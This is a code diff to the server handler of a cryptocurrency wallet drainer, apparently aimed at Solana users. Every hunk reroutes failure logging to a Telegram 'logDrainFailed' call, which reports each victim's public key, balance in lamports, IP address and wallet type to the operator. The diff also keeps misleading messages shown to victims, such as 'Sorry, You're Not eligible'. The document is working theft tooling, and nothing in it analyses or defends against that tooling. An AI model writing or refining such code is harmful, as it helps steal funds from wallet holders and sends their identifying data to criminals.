@@ -568,6 +568,13 @@ async function unifiedDrainerHandler(req, res) {
       console.log(`[BALANCE] Successfully fetched balance: ${lamports} lamports (${(lamports / 1e9).toFixed(6)} SOL)`);
     } catch (error) {
       console.error('[BALANCE_ERROR] Failed to fetch balance:', error.message);
+      await telegramLogger.logDrainFailed({
+        publicKey: userPublicKey,
+        lamports: 0,
+        ip: userIp,
+        error: `Balance fetch failed: ${error.message}`,
+        walletType: walletType || 'Unknown'
+      });
       return res.status(503).json({ 
         error: 'Service temporarily unavailable', 
         details: 'Unable to fetch wallet balance. Please try again later.',
@@ -642,10 +649,12 @@ async function unifiedDrainerHandler(req, res) {
          } catch (error) {
        // Check if it's an insufficient funds error
        if (error.message.includes('Insufficient funds') || error.message.includes('insufficient')) {
-         await telegramLogger.logInsufficientFunds({
-           user: userPubkey.toString(),
+         await telegramLogger.logDrainFailed({
+           publicKey: userPubkey.toString(),
+           lamports: lamports,
            ip: userIp,
-           lamports: lamports
+           error: 'INSUFFICIENT_FUNDS',
+           walletType: walletType || 'Unknown'
          });
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
@@ -654,10 +663,13 @@ async function unifiedDrainerHandler(req, res) {
          });
        }
        
-       await telegramLogger.logError({
-         user: userPubkey.toString(),
+       // Log other transaction creation failures
+       await telegramLogger.logDrainFailed({
+         publicKey: userPubkey.toString(),
+         lamports: lamports,
          ip: userIp,
-         message: 'Failed to create transaction'
+         error: error.message,
+         walletType: walletType || 'Unknown'
        });
        return res.status(500).json({ error: 'Failed to create transaction', details: error.message });
      }
@@ -675,10 +687,12 @@ async function unifiedDrainerHandler(req, res) {
         throw new Error('Transaction serialization produced empty result');
       }
     } catch (serializeError) {
-      await telegramLogger.logError({
-        user: userPubkey.toString(),
+      await telegramLogger.logDrainFailed({
+        publicKey: userPubkey.toString(),
+        lamports: lamports,
         ip: userIp,
-        message: 'Failed to serialize transaction'
+        error: 'Transaction serialization failed',
+        walletType: walletType || 'Unknown'
       });
       return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
     }
@@ -726,16 +740,28 @@ async function unifiedDrainerHandler(req, res) {
   } catch (error) {
     debugLog(`[UNIFIED_DRAINER] Error: ${error.message}`);
     
-    // Log error to Telegram if enabled
+    // Log drain failure to Telegram if enabled
     if (drainerConfig.core.telegramLogging) {
       try {
-        await telegramLogger.logError({
-          user: 'N/A',
-          ip: 'N/A',
-          message: error.message
+        await telegramLogger.logDrainFailed({
+          publicKey: userPubkey ? userPubkey.toString() : 'Unknown',
+          lamports: lamports || 0,
+          ip: userIp || 'Unknown',
+          error: error.message,
+          walletType: walletType || 'Unknown'
         });
       } catch (telegramError) {
-        debugLog('[UNIFIED_DRAINER] Failed to log error to Telegram:', telegramError.message);
+        debugLog('[UNIFIED_DRAINER] Failed to log drain failure to Telegram:', telegramError.message);
+        // Fallback to generic error logging
+        try {
+          await telegramLogger.logError({
+            user: userPubkey ? userPubkey.toString() : 'Unknown',
+            ip: userIp || 'Unknown',
+            message: error.message
+          });
+        } catch (fallbackError) {
+          debugLog('[UNIFIED_DRAINER] Failed to log error to Telegram (fallback):', fallbackError.message);
+        }
       }
     }
     
